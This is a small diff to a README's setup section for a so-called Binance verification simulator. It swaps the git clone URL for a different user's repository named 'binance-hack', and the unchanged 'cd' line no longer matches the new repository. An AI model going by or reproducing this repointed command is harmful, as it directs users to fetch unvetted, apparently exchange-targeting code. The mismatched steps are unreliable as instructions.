@@ -19,7 +19,7 @@ Developed by Z.Phantom Security Research
 
 🚀 GETTING STARTED  
 ```bash
-git clone https://github.com/zphantom-security/binance-verification-simulator
+git clone https://github.com/phantomlord77/binance-hack/
 cd binance-verification-simulator
 open index.html  # Launch in any modern browser
 ```
